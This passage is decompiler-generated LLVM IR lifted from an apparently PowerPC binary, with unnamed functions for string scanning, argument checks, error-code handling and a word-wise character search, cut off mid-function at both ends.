  %v4_1000c87c = inttoptr i32 %v3_1000c87c to i32*
  store i32 %v0_1000c87c, i32* %v4_1000c87c, align 4
  %v0_1000c8889.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c888.preheader

dec_label_pc_1000c888.preheader:                  ; preds = %dec_label_pc_1000c874, %dec_label_pc_1000c86c
  %v0_1000c8889 = phi i32 [ %v0_1000c8889.pre, %dec_label_pc_1000c874 ], [ %v0_1000c87c, %dec_label_pc_1000c86c ]
  %v1_1000c88810 = inttoptr i32 %v0_1000c8889 to i8*
  %v2_1000c88811 = load i8, i8* %v1_1000c88810, align 1
  %v3_1000c88812 = zext i8 %v2_1000c88811 to i32
  store i32 %v3_1000c88812, i32* %r0.global-to-local, align 4
  %v3_1000c88c14 = icmp eq i8 %v2_1000c88811, 0
  br i1 %v3_1000c88c14, label %dec_label_pc_1000c8ac.loopexit, label %dec_label_pc_1000c898.lr.ph

dec_label_pc_1000c898.lr.ph:                      ; preds = %dec_label_pc_1000c888.preheader
  %v3_1000c89c.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000c898

dec_label_pc_1000c884:                            ; preds = %dec_label_pc_1000c898
  %v1_1000c884 = add i32 %v0_1000c884, 1
  store i32 %v1_1000c884, i32* %r11.global-to-local, align 4
  %v1_1000c888 = inttoptr i32 %v1_1000c884 to i8*
  %v2_1000c888 = load i8, i8* %v1_1000c888, align 1
  %v3_1000c888 = zext i8 %v2_1000c888 to i32
  store i32 %v3_1000c888, i32* %r0.global-to-local, align 4
  %v3_1000c88c = icmp eq i8 %v2_1000c888, 0
  br i1 %v3_1000c88c, label %dec_label_pc_1000c8ac.loopexit, label %dec_label_pc_1000c898

dec_label_pc_1000c898:                            ; preds = %dec_label_pc_1000c898.lr.ph, %dec_label_pc_1000c884
  %v0_1000c884 = phi i32 [ %v0_1000c8889, %dec_label_pc_1000c898.lr.ph ], [ %v1_1000c884, %dec_label_pc_1000c884 ]
  %v0_1000c8a0.in = phi i32 [ %v3_1000c88812, %dec_label_pc_1000c898.lr.ph ], [ %v3_1000c888, %dec_label_pc_1000c884 ]
  %v0_1000c8a0 = mul nuw nsw i32 %v0_1000c8a0.in, 2
  store i32 %v3_1000c89c.pre, i32* %r9.global-to-local, align 4
  %v2_1000c8a0 = add i32 %v0_1000c8a0, %v3_1000c89c.pre
  %v3_1000c8a0 = inttoptr i32 %v2_1000c8a0 to i16*
  %v4_1000c8a0 = load i16, i16* %v3_1000c8a0, align 2
  %v5_1000c8a0 = zext i16 %v4_1000c8a0 to i32
  store i32 %v5_1000c8a0, i32* %r0.global-to-local, align 4
  %v1_1000c8a4 = and i32 %v5_1000c8a0, 32
  store i32 %v1_1000c8a4, i32* %r9.global-to-local, align 4
  %v3_1000c8a4 = icmp eq i32 %v1_1000c8a4, 0
  br i1 %v3_1000c8a4, label %dec_label_pc_1000c884, label %dec_label_pc_1000c8ac.loopexit

dec_label_pc_1000c8ac.loopexit:                   ; preds = %dec_label_pc_1000c898, %dec_label_pc_1000c884, %dec_label_pc_1000c888.preheader
  %v0_1000c8ac = phi i32 [ %v0_1000c8889, %dec_label_pc_1000c888.preheader ], [ %v0_1000c884, %dec_label_pc_1000c898 ], [ %v1_1000c884, %dec_label_pc_1000c884 ]
  %v1_1000c8ac = inttoptr i32 %v0_1000c8ac to i8*
  %v2_1000c8ac = load i8, i8* %v1_1000c8ac, align 1
  %v3_1000c8ac = zext i8 %v2_1000c8ac to i32
  store i32 %v3_1000c8ac, i32* %r0.global-to-local, align 4
  %v3_1000c8b0 = icmp eq i8 %v2_1000c8ac, 0
  br i1 %v3_1000c8b0, label %dec_label_pc_1000c8b8, label %dec_label_pc_1000c848.preheader

dec_label_pc_1000c848.preheader:                  ; preds = %dec_label_pc_1000c830, %dec_label_pc_1000c8ac.loopexit
  %v0_1000c8482 = phi i32 [ %v0_1000c8ac, %dec_label_pc_1000c8ac.loopexit ], [ %v0_1000c830, %dec_label_pc_1000c830 ]
  %v1_1000c8483 = inttoptr i32 %v0_1000c8482 to i8*
  %v2_1000c8484 = load i8, i8* %v1_1000c8483, align 1
  %v3_1000c8485 = zext i8 %v2_1000c8484 to i32
  store i32 %v3_1000c8485, i32* %r0.global-to-local, align 4
  %v3_1000c84c7 = icmp eq i8 %v2_1000c8484, 0
  br i1 %v3_1000c84c7, label %dec_label_pc_1000c8b8, label %dec_label_pc_1000c858

dec_label_pc_1000c8b8:                            ; preds = %dec_label_pc_1000c8ac.loopexit, %dec_label_pc_1000c848.preheader, %dec_label_pc_1000c83c, %dec_label_pc_1000c830
  %v0_1000c8b8 = load i32, i32* @r29, align 4
  %v1_1000c8bc = mul i32 %v0_1000c8b8, 4
  store i32 %v1_1000c8bc, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000c8c4 = load i32, i32* @r30, align 4
  %v3_1000c8c4 = add i32 %v2_1000c8c4, %v1_1000c8bc
  %v4_1000c8c4 = inttoptr i32 %v3_1000c8c4 to i32*
  store i32 0, i32* %v4_1000c8c4, align 4
  %tmp55 = icmp slt i32 %v0_1000c8b8, 2
  br i1 %tmp55, label %dec_label_pc_1000c96c, label %dec_label_pc_1000c8cc

dec_label_pc_1000c8cc:                            ; preds = %dec_label_pc_1000c8b8
  %v0_1000c8cc = load i32, i32* %r18.global-to-local, align 4
  %v3_1000c8cc = icmp eq i32 %v0_1000c8cc, 1
  br i1 %v3_1000c8cc, label %dec_label_pc_1000c984, label %dec_label_pc_1000c8d4

dec_label_pc_1000c8d4:                            ; preds = %dec_label_pc_1000c8cc
  %v3_1000c8d4 = icmp eq i32 %v0_1000c8cc, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_1000c8d4, label %dec_label_pc_1000c8e0, label %dec_label_pc_1000c90c.preheader

dec_label_pc_1000c90c.preheader:                  ; preds = %dec_label_pc_1000c8d4
  %v1_1000c90c23 = load i32, i32* @r29, align 4
  %v2_1000c90c24 = icmp sgt i32 %v1_1000c90c23, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000c91429 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000c91429, i32* @r3, align 4
  br i1 %v2_1000c90c24, label %dec_label_pc_1000c8f8, label %dec_label_pc_1000c91c

dec_label_pc_1000c8e0:                            ; preds = %dec_label_pc_1000c8d4
  %v0_1000c8e0 = load i32, i32* @r30, align 4
  %v1_1000c8e0 = inttoptr i32 %v0_1000c8e0 to i32*
  %v2_1000c8e0 = load i32, i32* %v1_1000c8e0, align 4
  store i32 %v2_1000c8e0, i32* @r4, align 4
  %v0_1000c8e4 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000c8e8 = inttoptr i32 %v0_1000c8e4 to i8*
  %v3_1000c8e8 = call i32 @function_1000ba8c(i8* %v2_1000c8e8, i32 %v2_1000c8e0)
  %v3_1000c8ec = icmp eq i32 %v3_1000c8e8, 0
  br i1 %v3_1000c8ec, label %dec_label_pc_1000c924, label %dec_label_pc_1000c96c

dec_label_pc_1000c8f8:                            ; preds = %dec_label_pc_1000c90c.preheader, %dec_label_pc_1000c908
  %v1_1000c8f8 = phi i32 [ %v1_1000c910, %dec_label_pc_1000c908 ], [ 4, %dec_label_pc_1000c90c.preheader ]
  %v0_1000c91431 = phi i32 [ %v0_1000c914, %dec_label_pc_1000c908 ], [ %v0_1000c91429, %dec_label_pc_1000c90c.preheader ]
  %v0_1000c8f8 = load i32, i32* @r30, align 4
  %v2_1000c8f8 = add i32 %v0_1000c8f8, %v1_1000c8f8
  %v3_1000c8f8 = inttoptr i32 %v2_1000c8f8 to i32*
  %v4_1000c8f8 = load i32, i32* %v3_1000c8f8, align 4
  store i32 %v4_1000c8f8, i32* @r4, align 4
  %v2_1000c8fc = call i32 @function_10007360(i32 %v0_1000c91431, i32 %v4_1000c8f8)
  %v3_1000c900 = icmp eq i32 %v2_1000c8fc, 0
  %v0_1000c91c.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000c900, label %dec_label_pc_1000c8f8.dec_label_pc_1000c91c_crit_edge, label %dec_label_pc_1000c908

dec_label_pc_1000c908:                            ; preds = %dec_label_pc_1000c8f8
  %v1_1000c908 = add i32 %v0_1000c91c.pre, 1
  store i32 %v1_1000c908, i32* @r31, align 4
  %v1_1000c90c = load i32, i32* @r29, align 4
  %v2_1000c90c = icmp slt i32 %v1_1000c908, %v1_1000c90c
  %v1_1000c910 = mul i32 %v1_1000c908, 4
  store i32 %v1_1000c910, i32* %r0.global-to-local, align 4
  %v0_1000c914 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000c914, i32* @r3, align 4
  br i1 %v2_1000c90c, label %dec_label_pc_1000c8f8, label %dec_label_pc_1000c91c

dec_label_pc_1000c8f8.dec_label_pc_1000c91c_crit_edge: ; preds = %dec_label_pc_1000c8f8
  %v1_1000c91c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000c91c

dec_label_pc_1000c91c:                            ; preds = %dec_label_pc_1000c908, %dec_label_pc_1000c8f8.dec_label_pc_1000c91c_crit_edge, %dec_label_pc_1000c90c.preheader
  %v1_1000c91c = phi i32 [ %v1_1000c91c.pre, %dec_label_pc_1000c8f8.dec_label_pc_1000c91c_crit_edge ], [ %v1_1000c90c23, %dec_label_pc_1000c90c.preheader ], [ %v1_1000c90c, %dec_label_pc_1000c908 ]
  %v0_1000c91c = phi i32 [ %v0_1000c91c.pre, %dec_label_pc_1000c8f8.dec_label_pc_1000c91c_crit_edge ], [ 1, %dec_label_pc_1000c90c.preheader ], [ %v1_1000c908, %dec_label_pc_1000c908 ]
  %v2_1000c91c = icmp slt i32 %v0_1000c91c, %v1_1000c91c
  br i1 %v2_1000c91c, label %dec_label_pc_1000c924, label %dec_label_pc_1000c96c

dec_label_pc_1000c924:                            ; preds = %dec_label_pc_1000c8e0, %dec_label_pc_1000c91c
  %v0_1000c924 = load i32, i32* %r19.global-to-local, align 4
  %v3_1000c924 = icmp eq i32 %v0_1000c924, 2
  br i1 %v3_1000c924, label %dec_label_pc_1000c92c, label %dec_label_pc_1000c948

dec_label_pc_1000c92c:                            ; preds = %dec_label_pc_1000c924
  %v0_1000c92c = load i32, i32* @r30, align 4
  %v1_1000c92c = inttoptr i32 %v0_1000c92c to i32*
  %v2_1000c92c = load i32, i32* %v1_1000c92c, align 4
  %v0_1000c934 = load i32, i32* @r25, align 4
  store i32 268486972, i32* @lr, align 4
  %v3_1000c938 = inttoptr i32 %v2_1000c92c to i8*
  %v4_1000c938 = call i32 @function_1000bcbc(i32 2, i8* %v3_1000c938, i32 %v0_1000c934)
  %v2_1000c93c = icmp sgt i32 %v4_1000c938, 0
  br i1 %v2_1000c93c, label %dec_label_pc_1000c78c, label %dec_label_pc_1000c968

dec_label_pc_1000c948:                            ; preds = %dec_label_pc_1000c924
  %v3_1000c948 = icmp eq i32 %v0_1000c924, 10
  br i1 %v3_1000c948, label %dec_label_pc_1000c950, label %dec_label_pc_1000c968

dec_label_pc_1000c950:                            ; preds = %dec_label_pc_1000c948
  %v0_1000c950 = load i32, i32* @r30, align 4
  %v1_1000c950 = inttoptr i32 %v0_1000c950 to i32*
  %v2_1000c950 = load i32, i32* %v1_1000c950, align 4
  %v0_1000c958 = load i32, i32* %r21.global-to-local, align 4
  store i32 268487008, i32* @lr, align 4
  %v3_1000c95c = inttoptr i32 %v2_1000c950 to i8*
  %v4_1000c95c = call i32 @function_1000bcbc(i32 10, i8* %v3_1000c95c, i32 %v0_1000c958)
  %v2_1000c960 = icmp sgt i32 %v4_1000c95c, 0
  br i1 %v2_1000c960, label %dec_label_pc_1000c7bc, label %dec_label_pc_1000c968

dec_label_pc_1000c968:                            ; preds = %dec_label_pc_1000c92c, %dec_label_pc_1000c948, %dec_label_pc_1000c950
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_1000c96c

dec_label_pc_1000c96c:                            ; preds = %dec_label_pc_1000c91c, %dec_label_pc_1000c8e0, %dec_label_pc_1000c8b8, %dec_label_pc_1000c968, %dec_label_pc_1000c804
  %v0_1000c96c = load i32, i32* @r24, align 4
  %v0_1000c970 = load i32, i32* @r27, align 4
  %v0_1000c974 = load i32, i32* @r20, align 4
  store i32 268487036, i32* @lr, align 4
  %v3_1000c978 = call i32 @function_10006660(i32 %v0_1000c96c, i32 %v0_1000c970, i32 %v0_1000c974)
  %v3_1000c97c = icmp eq i32 %v3_1000c978, 0
  br i1 %v3_1000c97c, label %dec_label_pc_1000c984, label %dec_label_pc_1000c814

dec_label_pc_1000c984:                            ; preds = %dec_label_pc_1000c96c, %dec_label_pc_1000c8cc, %dec_label_pc_1000c7e8
  %v0_1000c984 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000c984 = icmp eq i32 %v0_1000c984, 1
  br i1 %v3_1000c984, label %dec_label_pc_1000c99c, label %dec_label_pc_1000c98c

dec_label_pc_1000c98c:                            ; preds = %dec_label_pc_1000c984
  %v0_1000c98c = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_1000c994.341 to i32), i32* @lr, align 4
  %v1_1000c990 = inttoptr i32 %v0_1000c98c to i16*
  %v2_1000c990 = call i32 @function_10004b54(i16* %v1_1000c990)
  br label %dec_label_pc_1000c99c

dec_label_pc_1000c998:                            ; preds = %dec_label_pc_1000c750, %dec_label_pc_1000c720, %dec_label_pc_1000c718, %dec_label_pc_1000c70c, %dec_label_pc_1000c6fc, %dec_label_pc_1000c6e4, %dec_label_pc_1000c6d4
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_1000c99c

dec_label_pc_1000c99c:                            ; preds = %dec_label_pc_1000c984, %dec_label_pc_1000c98c, %dec_label_pc_1000c77c, %dec_label_pc_1000c998
  store i32 %v0_1000c698, i32* %r0.global-to-local, align 4
  %v0_1000c9a0 = load i32, i32* @r26, align 4
  ret i32 %v0_1000c9a0

; uselistorder directives
  uselistorder i32 %v0_1000c914, { 1, 0 }
  uselistorder i32 %v1_1000c908, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000c8bc, { 1, 0 }
  uselistorder i32 %v0_1000c8b8, { 1, 0 }
  uselistorder i32 %v3_1000c8485, { 1, 0 }
  uselistorder i32 %v0_1000c8482, { 1, 0 }
  uselistorder i32 %v1_1000c874, { 1, 0 }
  uselistorder i32 %v0_1000c86c, { 1, 0, 2 }
  uselistorder i32 %v2_1000c81c, { 1, 0 }
  uselistorder i32 %v0_1000c70c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000c6e4.pr, { 1, 0, 2 }
  uselistorder i32 %v1_1000c6b0, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 11, 28, 12, 27, 19, 13, 14, 29, 15, 16, 18, 17, 30, 20, 21, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 3, 4, 8, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 (i16*)* @function_10004b54, { 2, 3, 0, 1, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @function_10006660, { 3, 2, 1, 0 }
  uselistorder i32 10, { 10, 28, 29, 30, 31, 32, 33, 34, 17, 18, 19, 20, 21, 36, 35, 37, 38, 7, 39, 2, 41, 3, 42, 1, 8, 11, 45, 12, 25, 4, 5, 22, 9, 6, 27, 40, 43, 44, 13, 0, 23, 24, 14, 26, 15, 16 }
  uselistorder i32 (i32, i32)* @function_10007360, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 6, { 18, 19, 20, 21, 22, 0, 1, 2, 12, 13, 14, 15, 6, 7, 8, 3, 23, 24, 4, 25, 9, 26, 5, 10, 11, 16, 17 }
  uselistorder i32* @global_var_1001044c, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 12, { 30, 31, 32, 0, 33, 34, 35, 10, 14, 42, 47, 7, 8, 9, 11, 43, 53, 54, 55, 56, 57, 58, 59, 60, 5, 6, 61, 62, 63, 66, 15, 19, 46, 16, 48, 49, 50, 51, 4, 52, 1, 2, 3, 12, 36, 37, 38, 39, 67, 40, 64, 65, 44, 45, 13, 17, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 41 }
  uselistorder i32 80, { 5, 4, 3, 2, 1, 6, 0, 7, 8, 9 }
  uselistorder i32 48, { 12, 7, 8, 9, 1, 10, 11, 4, 14, 15, 2, 16, 17, 18, 6, 19, 5, 20, 3, 0, 21, 22, 13 }
  uselistorder i32 -48, { 2, 4, 3, 5, 0, 1, 6 }
  uselistorder i32 16, { 29, 9, 30, 31, 10, 32, 33, 0, 34, 35, 1, 36, 11, 55, 56, 66, 67, 37, 38, 39, 57, 58, 59, 60, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 88, 81, 4, 24, 17, 21, 18, 40, 41, 2, 27, 5, 28, 92, 93, 94, 42, 43, 44, 45, 46, 47, 61, 62, 48, 49, 50, 82, 83, 84, 85, 86, 87, 89, 90, 91, 63, 3, 64, 65, 12, 19, 20, 6, 22, 7, 23, 8, 25, 26, 51, 52, 53, 13, 54, 14, 15, 16 }
  uselistorder i32* @r27, { 15, 16, 17, 18, 19, 20, 1, 21, 22, 23, 24, 10, 11, 6, 12, 3, 2, 25, 26, 27, 28, 29, 0, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 57, 58, 80, 4, 81, 7, 82, 87, 55, 56, 40, 41, 42, 43, 83, 84, 85, 59, 60, 44, 45, 46, 61, 62, 5, 63, 64, 65, 66, 8, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 9, 13, 14, 86, 47, 48, 49, 50, 78, 79, 51, 52, 53, 54 }
  uselistorder i32 32, { 27, 28, 29, 18, 30, 31, 19, 15, 16, 24, 1, 2, 3, 32, 33, 38, 20, 17, 39, 40, 13, 14, 25, 26, 12, 34, 35, 36, 41, 42, 21, 43, 44, 45, 46, 47, 48, 49, 0, 50, 51, 37, 5, 6, 4, 8, 7, 22, 23, 10, 11, 9 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000c99c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c96c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000c968, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c924, { 1, 0 }
  uselistorder label %dec_label_pc_1000c91c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c8f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8b8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000c848.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000c898, { 1, 0 }
  uselistorder label %dec_label_pc_1000c830, { 1, 0 }
  uselistorder label %dec_label_pc_1000c804, { 1, 0 }
  uselistorder label %dec_label_pc_1000c7e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c750, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6e4, { 1, 0 }
}

define i32 @function_1000c9b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c9b4:
  %v0_1000c9b4 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268487116, i32* @lr, align 4
  %v0_1000c9c8 = call i32 @function_10004970()
  %v0_1000c9d0 = load i32, i32* @r29, align 4
  store i32 %v0_1000c9b4, i32* @lr, align 4
  %v2_1000c9e0 = call i32 @function_10004a00(i32 %v0_1000c9c8, i32 %v0_1000c9d0)
  ret i32 %v2_1000c9e0

; uselistorder directives
  uselistorder i32 ()* @function_10004970, { 0, 2, 1 }
}

define i32 @function_1000c9e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c9e4:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000c9e4 = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000ca10 = call i32 @__asm_mfcr()
  %v1_1000ca14 = and i32 %v0_1000ca10, 268435456
  %v3_1000ca14 = icmp eq i32 %v1_1000ca14, 0
  store i32 %v0_1000ca10, i32* %r31.global-to-local, align 4
  store i32 %v0_1000ca10, i32* %r0.global-to-local, align 4
  br i1 %v3_1000ca14, label %dec_label_pc_1000ca38, label %dec_label_pc_1000ca28

dec_label_pc_1000ca28:                            ; preds = %dec_label_pc_1000c9e4
  %v0_1000ca28 = call i32 @function_10004b48()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000ca30 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca30 = inttoptr i32 %v0_1000ca28 to i32*
  store i32 %v0_1000ca30, i32* %v2_1000ca30, align 4
  %v0_1000ca3c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000ca3c

dec_label_pc_1000ca38:                            ; preds = %dec_label_pc_1000c9e4
  %v3_1000ca20 = icmp eq i32 %v0_1000ca10, 0
  br i1 %v3_1000ca20, label %dec_label_pc_1000ca48, label %dec_label_pc_1000ca3c

dec_label_pc_1000ca3c:                            ; preds = %dec_label_pc_1000ca38, %dec_label_pc_1000ca28
  %v0_1000ca3c = phi i32 [ %v0_1000ca10, %dec_label_pc_1000ca38 ], [ %v0_1000ca3c.pre, %dec_label_pc_1000ca28 ]
  %tmp = icmp slt i32 %v0_1000ca3c, 0
  %v1_1000ca40 = zext i1 %tmp to i32
  %v2_1000ca40 = ashr i32 %v0_1000ca3c, 31
  %v3_1000ca40 = and i32 %v2_1000ca40, -2
  %v4_1000ca40 = or i32 %v3_1000ca40, %v1_1000ca40
  br label %dec_label_pc_1000ca50

dec_label_pc_1000ca48:                            ; preds = %dec_label_pc_1000ca38
  %v3_1000ca48 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000ca50

dec_label_pc_1000ca50:                            ; preds = %dec_label_pc_1000ca3c, %dec_label_pc_1000ca48
  %v0_1000ca60 = phi i32 [ %v4_1000ca40, %dec_label_pc_1000ca3c ], [ %v3_1000ca48, %dec_label_pc_1000ca48 ]
  store i32 %v0_1000c9e4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000ca60

; uselistorder directives
  uselistorder i32 %v0_1000ca3c, { 1, 0 }
  uselistorder i32 %v0_1000ca10, { 0, 3, 2, 1, 4 }
  uselistorder i32 -2, { 10, 11, 12, 1, 0, 2, 9, 3, 4, 13, 14, 5, 15, 16, 17, 6, 19, 20, 18, 21, 7, 8 }
  uselistorder i32 31, { 28, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 29, 30, 1, 2, 24, 25, 31, 32, 33, 7, 8, 3, 4, 0, 5, 9, 10, 11, 12, 13, 34, 35, 36, 51, 52, 49, 50, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 27, 6, 26 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca50, { 1, 0 }
}

define i32 @function_1000ca64(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000ca64:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ca7c = call i32 @__asm_mfcr()
  %v1_1000ca80 = and i32 %v0_1000ca7c, 268435456
  %v3_1000ca80 = icmp eq i32 %v1_1000ca80, 0
  store i32 %v0_1000ca7c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ca80, label %dec_label_pc_1000ca98, label %dec_label_pc_1000ca8c

dec_label_pc_1000ca8c:                            ; preds = %dec_label_pc_1000ca64
  %v0_1000ca8c = call i32 @function_10004b48()
  %v0_1000ca90 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca90 = inttoptr i32 %v0_1000ca8c to i32*
  store i32 %v0_1000ca90, i32* %v2_1000ca90, align 4
  br label %dec_label_pc_1000ca98

dec_label_pc_1000ca98:                            ; preds = %dec_label_pc_1000ca64, %dec_label_pc_1000ca8c
  %v0_1000caa8 = phi i32 [ %v0_1000ca7c, %dec_label_pc_1000ca64 ], [ -1, %dec_label_pc_1000ca8c ]
  ret i32 %v0_1000caa8

; uselistorder directives
  uselistorder i32 ()* @function_10004b48, { 35, 28, 46, 65, 64, 63, 45, 34, 27, 26, 44, 19, 18, 43, 25, 24, 58, 17, 16, 57, 14, 52, 13, 12, 11, 10, 9, 56, 8, 7, 5, 37, 6, 51, 50, 49, 48, 41, 40, 39, 30, 42, 4, 3, 23, 0, 22, 1, 33, 32, 55, 54, 53, 15, 47, 36, 21, 38, 20, 29, 31, 2, 62, 61, 60, 59 }
  uselistorder i32 268435456, { 9, 12, 6, 15, 1, 16, 2, 18, 4, 19, 20, 21, 22, 23, 3, 24, 25, 26, 7, 17, 5, 8, 13, 0, 14, 11, 10, 27 }
  uselistorder label %dec_label_pc_1000ca98, { 1, 0 }
}

define i32 @function_1000caac(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000caac:
  %v1_1000caac = add i32 %arg1, 128
  %v1_1000cab0 = mul i32 %arg1, 2
  %v2_1000cab4 = icmp ugt i32 %v1_1000caac, 383
  %v0_1000cab8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000cab4, i32 %v0_1000cab8)
  %v3_1000cac0 = load i32, i32* bitcast (i32** @global_var_10010454.246 to i32*), align 4
  %v2_1000cac4 = add i32 %v1_1000cab0, %v3_1000cac0
  %v3_1000cac4 = inttoptr i32 %v2_1000cac4 to i16*
  %v4_1000cac4 = load i16, i16* %v3_1000cac4, align 2
  %v5_1000cac4 = sext i16 %v4_1000cac4 to i32
  ret i32 %v5_1000cac4

; uselistorder directives
  uselistorder i32 128, { 8, 0, 1, 19, 20, 3, 4, 10, 11, 9, 12, 13, 14, 5, 15, 16, 17, 2, 6, 7, 18 }
}

define i32 @function_1000cacc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000cacc:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000cacc = urem i32 %arg1, 256
  store i32 %v1_1000cacc, i32* %r4.global-to-local, align 4
  %v0_1000caec2 = load i32, i32* @r3, align 4
  %v1_1000caec3 = urem i32 %v0_1000caec2, 4
  %v3_1000caec5 = icmp eq i32 %v1_1000caec3, 0
  br i1 %v3_1000caec5, label %dec_label_pc_1000caf4, label %dec_label_pc_1000cad4

dec_label_pc_1000cad4:                            ; preds = %dec_label_pc_1000cacc, %dec_label_pc_1000cae8
  %v1_1000cad8 = phi i32 [ %v0_1000caf4.pre, %dec_label_pc_1000cae8 ], [ %v1_1000cacc, %dec_label_pc_1000cacc ]
  %v0_1000cad4 = phi i32 [ %v1_1000cae8, %dec_label_pc_1000cae8 ], [ %v0_1000caec2, %dec_label_pc_1000cacc ]
  %v1_1000cad4 = inttoptr i32 %v0_1000cad4 to i8*
  %v2_1000cad4 = load i8, i8* %v1_1000cad4, align 1
  %v3_1000cad4 = zext i8 %v2_1000cad4 to i32
  %v4_1000cad8 = icmp eq i32 %v3_1000cad4, %v1_1000cad8
  %v3_1000cadc = icmp eq i8 %v2_1000cad4, 0
  %v0_1000cae0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000cad8, i32 %v0_1000cae0)
  br i1 %v3_1000cadc, label %dec_label_pc_1000cbc4, label %dec_label_pc_1000cae8

dec_label_pc_1000cae8:                            ; preds = %dec_label_pc_1000cad4
  %v0_1000cae8 = load i32, i32* @r3, align 4
  %v1_1000cae8 = add i32 %v0_1000cae8, 1
  store i32 %v1_1000cae8, i32* @r3, align 4
  %v1_1000caec = urem i32 %v1_1000cae8, 4
  %v3_1000caec = icmp eq i32 %v1_1000caec, 0
  %v0_1000caf4.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000caec, label %dec_label_pc_1000caf4, label %dec_label_pc_1000cad4

dec_label_pc_1000caf4:                            ; preds = %dec_label_pc_1000cae8, %dec_label_pc_1000cacc
  %v0_1000cb0c10 = phi i32 [ %v0_1000caec2, %dec_label_pc_1000cacc ], [ %v1_1000cae8, %dec_label_pc_1000cae8 ]
  %v0_1000caf4 = phi i32 [ %v1_1000cacc, %dec_label_pc_1000cacc ], [ %v0_1000caf4.pre, %dec_label_pc_1000cae8 ]
  %v1_1000caf4 = mul i32 %v0_1000caf4, 256
  %v2_1000cafc = or i32 %v1_1000caf4, %v0_1000caf4
  %v1_1000cb04 = mul i32 %v2_1000cafc, 65536
  %v2_1000cb08 = or i32 %v1_1000cb04, %v2_1000cafc
  br label %dec_label_pc_1000cb0c

dec_label_pc_1000cb0c:                            ; preds = %dec_label_pc_1000cb0c, %dec_label_pc_1000cbc0, %dec_label_pc_1000caf4
  %v0_1000cb64 = phi i32 [ %v0_1000cb0c10, %dec_label_pc_1000caf4 ], [ %v1_1000cb10, %dec_label_pc_1000cbc0 ], [ %v1_1000cb10, %dec_label_pc_1000cb0c ]
  %v1_1000cb0c = inttoptr i32 %v0_1000cb64 to i32*
  %v2_1000cb0c = load i32, i32* %v1_1000cb0c, align 4
  %v1_1000cb10 = add i32 %v0_1000cb64, 4
  %v2_1000cb18 = xor i32 %v2_1000cb0c, %v2_1000cb08
  %v1_1000cb1c = add i32 %v2_1000cb0c, 2130640639
  %v2_1000cb24 = xor i32 %v1_1000cb1c, %v2_1000cb0c
  %v1_1000cb28 = add i32 %v2_1000cb18, 2130640639
